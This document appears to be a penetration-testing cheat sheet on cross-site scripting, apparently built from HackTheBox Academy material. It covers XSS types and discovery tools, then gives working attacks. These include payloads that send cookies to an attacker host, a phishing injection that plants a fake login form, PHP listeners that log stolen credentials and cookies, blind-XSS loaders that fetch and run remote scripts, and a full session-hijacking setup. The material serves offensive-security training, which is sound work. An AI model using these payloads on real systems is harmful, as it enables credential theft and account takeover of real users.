# Cross-Site Scripting (XSS)

## Types of XSS
There are three main types of XSS vulnerabilities:

| Type                | Description                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| Stored (Persistent) XSS | Occurs when user input is stored in a database and displayed (e.g., posts). |
| Reflected (Non-Persistent) XSS | Occurs when input is processed and shown without storage (e.g., search). |
| DOM-based XSS       | Occurs when input is client-side processed and displayed (e.g., parameters). |

## Discovery

### Basic test

```js
<script>alert(window.origin)</script>
```

### Tools

- Nessus
- Burp Pro
- ZAP
- [XSS Strike](https://github.com/s0md3v/XSStrike)
- [XSSer](https://github.com/epsylon/xsser)

#### XSS Strike

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

## Exploiting XSS

### XSS Payloads

| Code | Description |
|------|-------------|
| `<script>alert(window.origin)</script>` | windows.origin shows the URL of the stored XSS if IFrames being used |
| `<script>alert(document.cookie)</script>` | document.cookie shows the cookie of the current page/document |
| `<plaintext>` | Stops the rendoring of any HTML code that comes after |
| `<script>print()</script>` | Pop up the browser print dialog |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload. Use when script tag gets sanitised |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |

- [PayloadAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)

**Note:** XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

### Phishing

Initial step is to identify a working payload, ie:

```js
'><script>alert(1)</script>
```

Example of a basic HTML login form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Which can be minified and put into JS:

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

To make the new form more likely to succeed, the original page HTML code should be removed:

Original code example:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Removal code:

```js
document.getElementById('urlform').remove()
```

Adding a comment tag to the end of the payload will remove any remaining code after the exploit form:

```html
...PAYLOAD... <!-- 
```

Complete injection code:

```js
'><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

The payload should then be added to the URL parameter, encoded, and sent to the victim:

```http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--```

We can then use a basic PHP listener that will retrieve the creds and send the victim to the origin page, simulating a successful login:

**index.php**

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vim index.php #write index.php to file here
sudo php -S 0.0.0.0:8080
```

## Blind XSS detection

Occur with forms only accessible by certain user:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

We can detect the presence of blind XSS by starting a netcat listener or php server and entering a script that calls to it:

```html
<script src="http://OUR_IP/script.js"></script>
```

If the form has multiple fields we would detect which field is vulnerable like so:

```html
<script src=http://OUR_IP/fullname></script> #Used in the fullname field
<script src=http://OUR_IP/username></script> #Used in the username field
```

**Tip:** Email maybe validated on the front-end and back-end, thus is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext.

We made need to try multiple payload types, one at a time and appending each field name:

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

## Session hijaking

If we successfully find a blind XSS vulnerability we can attempt a session hijaking attack.

Create two files:

**script.js**

```js
new Image().src='http://OURIP:OURPO/index.php?c='+document.cookie;
```

**index.php**

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start a php server:

```bash
php -S 0.0.0.0:OURPO
```

Use identified exploit to call script.js, ie:

```js
"><script src=http://OURIP:OURPO/script.js></script>
```

## Useful Commands

| Command | Description |
|---------|-------------|
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run xsstrike on a url parameter |
| `sudo nc -lvnp 8080` | Start netcat listener |
| `sudo php -S 0.0.0.0:8080` | Start PHP server |

Use cat to write to files:

```bash
cat << 'EOF' > script.js
new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
EOF
```

## Useful Links

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
